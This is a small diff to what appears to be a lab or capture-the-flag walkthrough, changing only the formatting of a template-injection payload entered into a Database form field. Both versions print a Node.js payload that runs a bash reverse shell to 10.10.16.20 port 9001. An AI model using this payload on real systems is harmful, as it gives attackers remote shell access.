@@ -72,9 +72,7 @@ To get a shell we follow the following steps.
 - Choose MySQL as the driver
 - Input the following payload into the Database form field
 
-```text
-{{ process.mainModule.require('child_process').exec('/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.16.20/9001 0>&1"') }}
-```
+`{{ process.mainModule.require('child_process').exec('/bin/bash -c "/bin/bash -i >& /dev/tcp/10.10.16.20/9001 0>&1"') }}`
 
 We setup a listener and click `Test` button.
 
